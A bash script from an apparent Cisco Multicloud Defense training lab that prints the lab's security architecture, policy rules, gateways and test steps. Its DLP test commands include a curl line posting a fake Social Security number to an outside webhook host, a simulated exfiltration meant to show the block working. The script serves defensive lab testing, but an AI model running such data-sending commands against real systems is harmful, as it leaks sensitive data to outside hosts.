#!/bin/bash

# Cisco Multicloud Defense - Display Security Policies and Architecture
# This script displays all current security configurations and protection architecture

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Color

echo ""
echo "╔════════════════════════════════════════════════════════════════════════════════════════════════╗"
echo "║              Cisco Multicloud Defense - Security Policy Viewer                              ║"
echo "╚════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo ""

# Check if terraform is installed
if ! command -v terraform &> /dev/null; then
    echo -e "${RED}❌ Terraform is not installed${NC}"
    echo "Please install Terraform first: https://www.terraform.io/downloads"
    exit 1
fi

# Check if infrastructure is deployed
if [ ! -f "terraform.tfstate" ] || [ ! -s "terraform.tfstate" ]; then
    echo -e "${RED}❌ No infrastructure deployed${NC}"
    echo ""
    echo "Please run deployment scripts first:"
    echo "  1. ./1-init-lab.sh"
    echo "  2. ./2-deploy.sh"
    echo "  3. ./3-secure.sh"
    echo ""
    exit 1
fi

# Get pod number
POD_NUMBER=$(grep -E '^pod_number' terraform.tfvars 2>/dev/null | awk -F'=' '{print $2}' | tr -d ' "')

if [ -z "$POD_NUMBER" ]; then
    echo -e "${RED}❌ Pod number not found in terraform.tfvars${NC}"
    echo "Please run ./1-init-lab.sh first"
    exit 1
fi

echo -e "${GREEN}✓ Pod Number: ${POD_NUMBER}${NC}"
echo ""

# Source environment helper for IP addresses
if [ -f "env-helper.sh" ]; then
    source ./env-helper.sh
    export_deployment_vars
fi

# Function to get resource details from Terraform state
get_resource_info() {
    local resource_type=$1
    local resource_name=$2
    local attribute=$3
    
    terraform state show "${resource_type}.${resource_name}" 2>/dev/null | grep -m1 "^\s*${attribute}\s*=" | sed 's/.*=\s*//' | tr -d '"'
}

# Check if security policies are deployed
SECURITY_DEPLOYED=false
if terraform state list 2>/dev/null | grep -q "ciscomcd_policy_rule_set"; then
    SECURITY_DEPLOYED=true
fi

if [ "$SECURITY_DEPLOYED" = false ]; then
    echo -e "${YELLOW}⚠️  Security policies not yet deployed${NC}"
    echo ""
    echo "Run ./3-secure.sh to deploy security policies first."
    echo ""
    exit 0
fi

# Display architecture diagram
echo -e "${CYAN}════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}📊 SECURITY ARCHITECTURE DIAGRAM${NC}"
echo -e "${CYAN}════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo ""
cat << 'EOF'
                                    🌐 Internet
                                        │
                    ┌───────────────────┼───────────────────┐
                    │                   │                   │
                    │                   │                   │
            ┌───────▼────────┐  ┌──────▼─────────┐  ┌─────▼──────────┐
            │  Management    │  │   App1 VPC     │  │   App2 VPC     │
            │  VPC (IGW)     │  │  (IGW/TGW)     │  │  (IGW/TGW)     │
            │ 10.{pod+200}.x │  │   10.{pod}.x   │  │ 10.{pod+100}.x │
            └───────┬────────┘  └────────┬───────┘  └────────┬───────┘
                    │                    │                     │
              ┌─────▼──────┐       ┌────▼─────┐         ┌────▼─────┐
              │  Jumpbox   │       │   App1   │         │   App2   │
              │ (t2.micro) │       │Instance  │         │Instance  │
              │            │       │          │         │          │
              │ SSH Access │◄──────┤  Web     │◄────────┤   Web    │
              │            │       │  Server  │         │  Server  │
              └────────────┘       └────┬─────┘         └────┬─────┘
                                        │                     │
                    ┌───────────────────┴─────────────────────┘
                    │
                    │ 🔒 Traffic flows through MCD Security
                    │
              ┌─────▼──────────────────────────────────────┐
              │    Transit Gateway (Shared - All Pods)     │
              │         tgw-0a878e2f5870e2ccf              │
              └─────┬──────────────────────────────────────┘
                    │
                    │ All traffic inspected here
                    │
          ┌─────────▼─────────┐
          │   Service VPC     │
          │ 192.168.{pod}.0/24│
          └─────┬──────┬──────┘
                │      │
         ┌──────▼──┐ ┌▼──────────┐
         │ Egress  │ │  Ingress  │
         │ Gateway │ │  Gateway  │
         │         │ │           │
         │ • DLP   │ │ • IPS     │
         │ • IPS   │ │ • WAF     │
         │ • SNAT  │ │ • Proxy   │
         └────┬────┘ └┬──────────┘
              │       │
              └───┬───┘
                  │
            🌐 Internet

EOF

echo ""
echo -e "${BLUE}Legend:${NC}"
echo "  🌐 = Internet connectivity"
echo "  🔒 = Security inspection point"
echo "  ┌─┐ = Infrastructure component"
echo "  │ = Traffic flow"
echo "  ◄── = SSH access path"
echo ""

# Display Address Objects
echo -e "${CYAN}════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}📍 ADDRESS OBJECTS${NC}"
echo -e "${CYAN}════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${YELLOW}Egress Address Objects:${NC}"
APP1_EGRESS_ID=$(get_resource_info "ciscomcd_address_object" "app1-egress-addr-object" "id")
APP2_EGRESS_ID=$(get_resource_info "ciscomcd_address_object" "app2-egress-addr-object" "id")

if [ -n "$APP1_EGRESS_ID" ]; then
    echo "  • pod${POD_NUMBER}-app1-egress (ID: $APP1_EGRESS_ID)"
    echo "    Type: DYNAMIC_USER_DEFINED_TAG"
    echo "    Tag: role=pod${POD_NUMBER}-prod"
    echo "    Purpose: Identifies App1 instances for egress policies"
    echo ""
fi

if [ -n "$APP2_EGRESS_ID" ]; then
    echo "  • pod${POD_NUMBER}-app2-egress (ID: $APP2_EGRESS_ID)"
    echo "    Type: DYNAMIC_USER_DEFINED_TAG"
    echo "    Tag: role=pod${POD_NUMBER}-shared"
    echo "    Purpose: Identifies App2 instances for east-west policies"
    echo ""
fi

echo -e "${YELLOW}Ingress Address Objects:${NC}"
APP1_INGRESS_ID=$(get_resource_info "ciscomcd_address_object" "app1-ingress-addr-object" "id")

if [ -n "$APP1_INGRESS_ID" ]; then
    echo "  • pod${POD_NUMBER}-app1-ingress (ID: $APP1_INGRESS_ID)"
    echo "    Type: STATIC"
    echo "    IP: 10.${POD_NUMBER}.100.10"
    echo "    Purpose: Backend address for ingress reverse proxy"
    echo ""
fi

# Display Service Objects
echo -e "${CYAN}════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}🔌 SERVICE OBJECTS${NC}"
echo -e "${CYAN}════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo ""

APP1_SVC_ID=$(get_resource_info "ciscomcd_service_object" "app1_svc_http" "id")
SSH_SVC_ID=$(get_resource_info "ciscomcd_service_object" "ssh_svc" "id")

if [ -n "$APP1_SVC_ID" ]; then
    echo -e "${YELLOW}HTTP Service:${NC}"
    echo "  • pod${POD_NUMBER}-app1 (ID: $APP1_SVC_ID)"
    echo "    Type: ReverseProxy"
    echo "    Protocol: TCP/HTTP"
    echo "    Ports: 80 → 80"
    echo "    Backend: 10.${POD_NUMBER}.100.10"
    echo "    Purpose: HTTP reverse proxy with IPS/WAF"
    echo ""
fi

if [ -n "$SSH_SVC_ID" ]; then
    echo -e "${YELLOW}SSH Service:${NC}"
    echo "  • pod${POD_NUMBER}-ssh (ID: $SSH_SVC_ID)"
    echo "    Type: ReverseProxy"
    echo "    Protocol: TCP"
    echo "    Ports: 22 → 22"
    echo "    Backend: 10.${POD_NUMBER}.100.10"
    echo "    Purpose: SSH reverse proxy for ingress"
    echo ""
fi

# Display DLP Profile
echo -e "${CYAN}════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}🔐 DATA LOSS PREVENTION (DLP) PROFILE${NC}"
echo -e "${CYAN}════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo ""

DLP_ID=$(get_resource_info "ciscomcd_profile_dlp" "block-ssn-dlp" "id")

if [ -n "$DLP_ID" ]; then
    echo -e "${YELLOW}DLP Profile: pod${POD_NUMBER}-block-ssn (ID: $DLP_ID)${NC}"
    echo "  • Pattern: US Social Security Number"
    echo "  • Pattern: US Social Security Number Without Dashes"
    echo "  • Match Count: 1 or more"
    echo "  • Action: Deny Log"
    echo "  • Purpose: Prevent SSN data exfiltration from App1"
    echo ""
    echo -e "${GREEN}Test Command:${NC}"
    echo "  ssh -i \$SSH_KEY ubuntu@\$APP1_PUBLIC_IP"
    echo "  curl -X POST https://webhook.site/test -d 'SSN: 123-45-6789'"
    echo "  # This should be BLOCKED by DLP"
    echo ""
fi

# Display Policy Rule Sets
echo -e "${CYAN}════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}📋 POLICY RULE SETS${NC}"
echo -e "${CYAN}════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo ""

EGRESS_POLICY_ID=$(get_resource_info "ciscomcd_policy_rule_set" "egress_policy" "id")
INGRESS_POLICY_ID=$(get_resource_info "ciscomcd_policy_rule_set" "ingress_policy" "id")

if [ -n "$EGRESS_POLICY_ID" ]; then
    echo -e "${YELLOW}1. Egress/East-West Policy: pod${POD_NUMBER}-egress-policy (ID: $EGRESS_POLICY_ID)${NC}"
    echo ""
    echo "   Rule 1: allow-ssh"
    echo "   ├─ Description: Allow SSH from any source to any destination"
    echo "   ├─ Type: Forwarding"
    echo "   ├─ Action: Allow Log"
    echo "   ├─ Source: any"
    echo "   ├─ Destination: any"
    echo "   ├─ Service: TCP (sample-egress-forward-tcp)"
    echo "   └─ State: ENABLED"
    echo ""
    echo "   Rule 2: rule1 (Egress with DLP)"
    echo "   ├─ Type: Forwarding"
    echo "   ├─ Action: Allow Log"
    echo "   ├─ Source: pod${POD_NUMBER}-app1-egress (App1 instances)"
    echo "   ├─ Destination: internet"
    echo "   ├─ Service: TCP with SNAT"
    echo "   ├─ DLP Profile: pod${POD_NUMBER}-block-ssn (🔐 SSN Protection)"
    echo "   ├─ IPS Profile: ciscomcd-sample-ips-balanced-alert"
    echo "   └─ State: ENABLED"
    echo ""
    echo "   Rule 3: rule2 (East-West)"
    echo "   ├─ Type: Forwarding"
    echo "   ├─ Action: Allow Log"
    echo "   ├─ Source: pod${POD_NUMBER}-app1-egress (App1)"
    echo "   ├─ Destination: pod${POD_NUMBER}-app2-egress (App2)"
    echo "   ├─ Service: TCP"
    echo "   └─ State: ENABLED"
    echo ""
    echo -e "   ${GREEN}Purpose:${NC} Controls outbound internet traffic and app-to-app communication"
    echo ""
fi

if [ -n "$INGRESS_POLICY_ID" ]; then
    echo -e "${YELLOW}2. Ingress Policy: pod${POD_NUMBER}-ingress-policy (ID: $INGRESS_POLICY_ID)${NC}"
    echo ""
    echo "   Rule 1: allow-ssh-ingress"
    echo "   ├─ Description: Allow SSH ingress"
    echo "   ├─ Type: ReverseProxy"
    echo "   ├─ Action: Allow Log"
    echo "   ├─ Source: any"
    echo "   ├─ Service: pod${POD_NUMBER}-ssh (SSH/22)"
    echo "   ├─ IPS Profile: ciscomcd-sample-ips-balanced-alert"
    echo "   └─ State: ENABLED"
    echo ""
    echo "   Rule 2: rule1 (HTTP Ingress)"
    echo "   ├─ Description: Ingress rule1"
    echo "   ├─ Type: ReverseProxy"
    echo "   ├─ Action: Allow Log"
    echo "   ├─ Source: any (Internet)"
    echo "   ├─ Service: pod${POD_NUMBER}-app1 (HTTP/80)"
    echo "   ├─ IPS Profile: ciscomcd-sample-ips-balanced-alert (🛡️ Threat Protection)"
    echo "   └─ State: ENABLED"
    echo ""
    echo -e "   ${GREEN}Purpose:${NC} Protects inbound web traffic with IPS/WAF"
    echo ""
fi

# Display Gateways
echo -e "${CYAN}════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}🚪 SECURITY GATEWAYS${NC}"
echo -e "${CYAN}════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo ""

EGRESS_GW_STATE=$(get_resource_info "ciscomcd_gateway" "aws-egress-gw" "gateway_state")
INGRESS_GW_STATE=$(get_resource_info "ciscomcd_gateway" "aws-ingress-gw" "gateway_state")

if [ -n "$EGRESS_GW_STATE" ]; then
    echo -e "${YELLOW}Egress Gateway: pod${POD_NUMBER}-egress-gw-aws${NC}"
    echo "  • Type: HUB"
    echo "  • Mode: EGRESS"
    echo "  • Instance Type: AWS_M5_LARGE"
    echo "  • State: $EGRESS_GW_STATE"
    echo "  • Policy: pod${POD_NUMBER}-egress-policy"
    echo "  • Region: us-east-1"
    echo "  • VPC: Service VPC (192.168.${POD_NUMBER}.0/24)"
    echo "  • Min Instances: 1"
    echo "  • Max Instances: 1"
    echo "  • Purpose: Inspects outbound traffic for DLP and threats"
    echo ""
fi

if [ -n "$INGRESS_GW_STATE" ]; then
    echo -e "${YELLOW}Ingress Gateway: pod${POD_NUMBER}-ingress-gw-aws${NC}"
    echo "  • Type: HUB"
    echo "  • Mode: INGRESS"
    echo "  • Instance Type: AWS_M5_LARGE"
    echo "  • State: $INGRESS_GW_STATE"
    echo "  • Policy: pod${POD_NUMBER}-ingress-policy"
    echo "  • Region: us-east-1"
    echo "  • VPC: Service VPC (192.168.${POD_NUMBER}.0/24)"
    echo "  • Min Instances: 1"
    echo "  • Max Instances: 1"
    echo "  • Purpose: Protects inbound web traffic with IPS/WAF"
    echo ""
fi

# Display Service VPC
echo -e "${CYAN}════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}🏗️  SERVICE VPC INFRASTRUCTURE${NC}"
echo -e "${CYAN}════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo ""

SVPC_ID=$(get_resource_info "ciscomcd_service_vpc" "svpc-aws" "vpc_id")

if [ -n "$SVPC_ID" ]; then
    echo -e "${YELLOW}Service VPC: pod${POD_NUMBER}-svpc-aws${NC}"
    echo "  • VPC ID: $SVPC_ID"
    echo "  • CIDR: 192.168.${POD_NUMBER}.0/24"
    echo "  • Region: us-east-1"
    echo "  • Availability Zone: us-east-1a"
    echo "  • Transit Gateway: tgw-0a878e2f5870e2ccf (🔒 Shared - Protected)"
    echo "  • NAT Gateway: Disabled"
    echo "  • Purpose: Hosts security gateways and load balancers"
    echo ""
fi

# Display Traffic Flow
echo -e "${CYAN}════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}🔄 TRAFFIC FLOW SUMMARY${NC}"
echo -e "${CYAN}════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${YELLOW}Egress Traffic (Outbound):${NC}"
echo "  App1 Instance → Transit Gateway → Egress Gateway → Internet"
echo "  └─ Inspected for: DLP (SSN blocking), IPS, SNAT"
echo ""

echo -e "${YELLOW}East-West Traffic (App-to-App):${NC}"
echo "  App1 Instance → Transit Gateway → Egress Gateway → App2 Instance"
echo "  └─ Inspected for: IPS, Logging"
echo ""

echo -e "${YELLOW}Ingress Traffic (Inbound):${NC}"
echo "  Internet → Transit Gateway → Ingress Gateway → App1 Instance"
echo "  └─ Inspected for: IPS, WAF, Threat Protection"
echo ""

echo -e "${YELLOW}Management Access:${NC}"
echo "  Admin → Jumpbox (IGW) → App1/App2 Instances (SSH)"
echo "  └─ Bypass: Not inspected, direct IGW routing"
echo ""

# Display Current Server Status
echo -e "${CYAN}════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}💻 PROTECTED RESOURCES${NC}"
echo -e "${CYAN}════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo ""

if [ -n "$JUMPBOX_PUBLIC_IP" ]; then
    echo -e "${YELLOW}Jumpbox (Management):${NC}"
    echo "  • Public IP: $JUMPBOX_PUBLIC_IP"
    echo "  • VPC: Management VPC (10.$((POD_NUMBER + 200)).0.0/16)"
    echo "  • Security: Direct IGW, not inspected"
    echo "  • Access: ssh -i \$SSH_KEY ubuntu@\$JUMPBOX_PUBLIC_IP"
    echo ""
fi

if [ -n "$APP1_PUBLIC_IP" ]; then
    echo -e "${YELLOW}Application 1 (Production):${NC}"
    echo "  • Public IP: $APP1_PUBLIC_IP"
    echo "  • Private IP: $APP1_PRIVATE_IP"
    echo "  • VPC: App1 VPC (10.${POD_NUMBER}.0.0/16)"
    echo "  • Protection: Egress DLP + IPS, Ingress IPS/WAF"
    echo "  • HTTP: http://$APP1_PUBLIC_IP"
    echo "  • SSH: ssh -i \$SSH_KEY ubuntu@\$APP1_PUBLIC_IP"
    echo ""
fi

if [ -n "$APP2_PUBLIC_IP" ]; then
    echo -e "${YELLOW}Application 2 (Shared):${NC}"
    echo "  • Public IP: $APP2_PUBLIC_IP"
    echo "  • Private IP: $APP2_PRIVATE_IP"
    echo "  • VPC: App2 VPC (10.$((POD_NUMBER + 100)).0.0/16)"
    echo "  • Protection: East-West inspection from App1"
    echo "  • HTTP: http://$APP2_PUBLIC_IP"
    echo "  • SSH: ssh -i \$SSH_KEY ubuntu@\$APP2_PUBLIC_IP"
    echo ""
fi

# Display Testing Commands
echo -e "${CYAN}════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}🧪 TESTING COMMANDS${NC}"
echo -e "${CYAN}════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${YELLOW}Test 1: DLP Protection (Should BLOCK)${NC}"
echo "  ssh -i \$SSH_KEY ubuntu@\$APP1_PUBLIC_IP"
echo "  curl -X POST https://webhook.site/test -d 'SSN: 123-45-6789'"
echo "  # Expected: Blocked by DLP, logged in MCD console"
echo ""

echo -e "${YELLOW}Test 2: East-West Communication (Should ALLOW)${NC}"
echo "  ssh -i \$SSH_KEY ubuntu@\$APP1_PUBLIC_IP"
echo "  curl http://\$APP2_PRIVATE_IP"
echo "  # Expected: Success, logged in MCD console"
echo ""

echo -e "${YELLOW}Test 3: Ingress HTTP (Should ALLOW with IPS)${NC}"
echo "  curl http://\$APP1_PUBLIC_IP"
echo "  # Expected: Success, inspected by IPS/WAF"
echo ""

echo -e "${YELLOW}Test 4: View Traffic in MCD Console${NC}"
echo "  1. Login: https://defense.cisco.com"
echo "  2. Navigate: Observe → Traffic"
echo "  3. Filter: pod${POD_NUMBER}"
echo "  4. Look for: DLP blocks, IPS alerts, allowed traffic"
echo ""

# Summary
echo -e "${GREEN}════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}✅ SECURITY CONFIGURATION SUMMARY${NC}"
echo -e "${GREEN}════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${CYAN}Active Protections:${NC}"
echo "  ✅ Data Loss Prevention (DLP) - Blocks SSN exfiltration"
echo "  ✅ Intrusion Prevention (IPS) - Detects threats on egress and ingress"
echo "  ✅ Web Application Firewall (WAF) - Protects inbound HTTP traffic"
echo "  ✅ East-West Inspection - Monitors app-to-app traffic"
echo "  ✅ Logging - All traffic logged for audit and analysis"
echo ""

echo -e "${CYAN}Infrastructure:${NC}"
echo "  ✅ 2 Security Gateways (Egress + Ingress)"
echo "  ✅ 1 Service VPC (192.168.${POD_NUMBER}.0/24)"
echo "  ✅ Transit Gateway Integration (Shared - Protected)"
echo "  ✅ Gateway Load Balancer (GWLB)"
echo ""

echo -e "${CYAN}Policy Coverage:${NC}"
echo "  ✅ 3 Egress/East-West Rules (SSH, Internet, App-to-App)"
echo "  ✅ 2 Ingress Rules (SSH, HTTP)"
echo "  ✅ 3 Address Objects (App1 Egress, App2 Egress, App1 Ingress)"
echo "  ✅ 2 Service Objects (HTTP, SSH)"
echo "  ✅ 1 DLP Profile (SSN Protection)"
echo ""

echo -e "${BLUE}📖 For more details, check the MCD Console at https://defense.cisco.com${NC}"
echo ""

